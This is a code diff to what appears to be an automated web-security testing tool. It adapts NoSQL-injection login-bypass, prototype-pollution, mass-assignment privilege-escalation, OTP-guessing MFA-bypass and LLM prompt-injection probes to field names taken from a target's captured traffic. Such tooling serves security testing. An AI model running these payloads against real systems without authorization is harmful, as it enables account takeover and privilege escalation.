@@ -223,6 +223,55 @@ class GenericHTTPExecutor(ExecutorBase):
             _add(p if p.startswith("http") else base + ("/" + p.lstrip("/")))
         return ordered
 
+    def _rs_ctx(self, experiment):
+        """Adapter so the request_schema helpers (which read ``ctx.captured_requests``)
+        work from an executor that only holds ``experiment``. Exposes the captured
+        traffic so field NAMES are derived from the target, never guessed."""
+        from types import SimpleNamespace
+        return SimpleNamespace(
+            captured_requests=experiment.input_parameters.get("captured_requests") or [],
+            endpoints=experiment.input_parameters.get("endpoints") or [],
+            target=self._base(experiment))
+
+    def _privilege_field_candidates(self, experiment) -> List[str]:
+        """Privilege/role field NAMES observed in the target's OWN objects, derived
+        from captured request/response bodies — so mass-assignment / prototype-
+        pollution gadgets adapt to the app's real schema instead of a fixed guess.
+        Returns names that look authorization-bearing (role/admin/verified/etc. by
+        name, or any boolean field). Empty when nothing was captured."""
+        import re as _re
+        want = _re.compile(r"(role|admin|priv|perm|scope|group|level|verif|approv|"
+                           r"active|enabled|premium|deluxe|staff|owner|is_?[a-z])", _re.I)
+        names, seen = [], set()
+
+        def _walk(o, depth=0):
+            if depth > 4 or not isinstance(o, dict):
+                return
+            for k, v in o.items():
+                kl = str(k).lower()
+                if k not in seen and (want.search(kl) or isinstance(v, bool)):
+                    seen.add(k)
+                    names.append(k)
+                if isinstance(v, dict):
+                    _walk(v, depth + 1)
+                elif isinstance(v, list):
+                    for it in v[:5]:
+                        _walk(it, depth + 1)
+
+        for r in (experiment.input_parameters.get("captured_requests") or []):
+            if not isinstance(r, dict):
+                continue
+            for blob in (r.get("body"), r.get("post_data"), r.get("response_body"),
+                         (r.get("response") or {}).get("body") if isinstance(r.get("response"), dict) else None):
+                if isinstance(blob, dict):
+                    _walk(blob)
+                elif isinstance(blob, str) and blob.strip().startswith("{"):
+                    try:
+                        _walk(json.loads(blob))
+                    except Exception:
+                        pass
+        return names
+
     def _credential_endpoints(self, experiment: SecurityExperiment) -> List[str]:
         """Credential-accepting endpoints discovered from captured traffic — any
         request whose body carries a password-shaped field. Finds the REAL login
@@ -759,6 +808,17 @@ class NoSQLiExecutor(GenericHTTPExecutor):
 
         rand = __import__("uuid").uuid4().hex[:12]
 
+        # Derive the target's REAL credential field names from captured traffic;
+        # build operator payloads over them so the bypass matches this app's login
+        # shape. Static combos are unioned as a fallback for shapes we didn't see.
+        _cf = rs.credential_fields(self._rs_ctx(experiment), ("login", "auth", "signin", "session"))
+        _uf, _pf = _cf["username_field"], _cf["password_field"]
+        dyn_payloads = []
+        for _op in ({"$ne": ""}, {"$gt": ""}, {"$regex": ".*"}, {"$exists": True}):
+            dyn_payloads.append({_uf: dict(_op), _pf: dict(_op)})
+        body_payloads = dyn_payloads + [p for p in self.NOSQLI_BODY_PAYLOADS
+                                        if not (set(p) == {_uf, _pf})]
+
         def _authed(st, bd):
             return st in (200, 201) and any(
                 s in (bd or "").lower() for s in
@@ -781,11 +841,11 @@ class NoSQLiExecutor(GenericHTTPExecutor):
             # baseline: syntactically valid but wrong credentials (no operators)
             b_status, b_body, _ = self._probe(
                 f"{base}{lp}", method="POST", headers=jhdr,
-                data=json.dumps({"email": f"{rand}@invalid.example",
-                                 "password": rand}).encode())
+                data=json.dumps({_uf: f"{rand}@invalid.example",
+                                 _pf: rand}).encode())
             if _authed(b_status, b_body):
                 continue  # authenticates on garbage creds → not a valid bypass oracle
-            for payload in self.NOSQLI_BODY_PAYLOADS:
+            for payload in body_payloads:
                 status, body, _ = self._probe(
                     f"{base}{lp}", method="POST", headers=jhdr,
                     data=json.dumps(payload).encode())
@@ -908,10 +968,24 @@ class PrototypePollutionExecutor(GenericHTTPExecutor):
         base = self._base(experiment)
         findings = []
 
+        # Gadget property names from the target's OWN objects (observed) polluted
+        # via __proto__/constructor, then the static gadgets as a floor — so the
+        # polluted field matches an authorization check this app actually performs.
+        def _gmut(f):
+            fl = f.lower()
+            val = "admin" if any(w in fl for w in ("role", "level", "group", "scope", "plan")) else True
+            return [{"__proto__": {f: val}}, {"constructor": {"prototype": {f: val}}}]
+        pollution_payloads = []
+        for f in self._privilege_field_candidates(experiment)[:6]:
+            pollution_payloads.extend(_gmut(f))
+        for _s in self.POLLUTION_PAYLOADS:               # static gadget floor
+            if _s not in pollution_payloads:
+                pollution_payloads.append(_s)
+
         json_eps = self._json_accepting_endpoints(experiment)
         for ep in json_eps[:12]:
             for method in ["PUT", "POST"]:
-                for payload in self.POLLUTION_PAYLOADS:
+                for payload in pollution_payloads:
                     status, body, _ = self._probe(
                         f"{base}{ep}", method=method,
                         headers={"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"},
@@ -1207,12 +1281,26 @@ class MassAssignmentExecutor(GenericHTTPExecutor):
         if not reg_eps and not update_eps:
             return _no_endpoints_result("no auth/user endpoints for mass-assignment")
 
+        # Privilege mutations: the target's OWN authorization-bearing fields
+        # (observed in captured objects) FIRST, then the static gadgets as a floor.
+        def _mut(f):
+            fl = f.lower()
+            if any(w in fl for w in ("role", "level", "group", "scope", "type", "plan", "tier")):
+                return {f: "admin"}
+            if "perm" in fl:
+                return {f: ["admin", "superuser"]}
+            return {f: True}
+        priv_fields = [_mut(f) for f in self._privilege_field_candidates(experiment)[:8]]
+        for _s in self.PRIV_FIELDS:                      # static gadget floor
+            if _s not in priv_fields:
+                priv_fields.append(_s)
+
         # Registration body mirrors the captured register form (real username /
-        # password / confirm field names); the mass-assignment PRIV_FIELDS merge on top.
+        # password / confirm field names); the privilege mutations merge on top.
         reg_body = rs.build_register_body(
             self._rs_ctx(experiment), f"masstest_{ts}@test.com", "Test1234!")
         for ep in reg_eps[:6]:
-            for extra in self.PRIV_FIELDS:
+            for extra in priv_fields:
                 payload = {**reg_body, **extra}
                 status, body, _ = self._probe(
                     f"{base}{ep}", method="POST",
@@ -1229,7 +1317,7 @@ class MassAssignmentExecutor(GenericHTTPExecutor):
 
         # 2. Profile update — PUT/PATCH on user/config endpoints (discovered above)
         for ep in update_eps[:6]:
-            for extra in self.PRIV_FIELDS[:3]:
+            for extra in priv_fields[:4]:
                 for method in ["PUT", "PATCH"]:
                     status, body, _ = self._probe(
                         f"{base}{ep}", method=method,
@@ -3241,10 +3329,18 @@ class MFABypassExecutor(GenericHTTPExecutor):
         if verify_eps and stage1_token:
             hdrs = {**headers, "Content-Type": "application/json",
                     "Authorization": f"Bearer {stage1_token}"}
+            # The target's REAL OTP field name from the captured verify body, with
+            # the static aliases as a floor.
+            _vb = rs.captured_body_for(
+                self._rs_ctx(experiment), ("verify", "mfa", "2fa", "otp", "totp", "code", "auth"))
+            otp_fields = [k for k in _vb.keys()] or []
+            for f in self.OTP_FIELDS:
+                if f not in otp_fields:
+                    otp_fields.append(f)
             for ep in verify_eps[:2]:
                 blocked = False
                 for otp in self.GUESSABLE_OTPS[:10]:
-                    for field in self.OTP_FIELDS[:4]:
+                    for field in otp_fields[:4]:
                         body = json.dumps({field: otp}).encode()
                         s, r, _ = self._probe(base + ep, method="POST",
                                               headers=hdrs, data=body)
@@ -4821,11 +4917,22 @@ class PromptInjectionTester(GenericHTTPExecutor):
             self.LLM_HINTS)
         eps = list(dict.fromkeys(eps))[:10]
 
+        # Prompt field names from the target's OWN captured LLM request body (only
+        # string-valued keys, so we don't clobber model/temperature params), with
+        # the static FIELDS as a floor.
+        _lb = rs.captured_body_for(
+            self._rs_ctx(experiment),
+            ("chat", "completion", "llm", "assistant", "/ai", "message", "prompt", "generate"))
+        llm_fields = [k for k, v in _lb.items() if isinstance(v, str)]
+        for f in self.FIELDS:
+            if f not in llm_fields:
+                llm_fields.append(f)
+
         hdrs = {**headers, "Content-Type": "application/json"}
         for ep in eps:
             hit_any = False
             for pl in self.INJECTIONS[:3]:
-                body = json.dumps({f: pl for f in self.FIELDS}).encode()
+                body = json.dumps({f: pl for f in llm_fields}).encode()
                 s, resp, _ = self._probe(ep, method="POST", headers=hdrs, data=body)
                 if not s:
                     continue
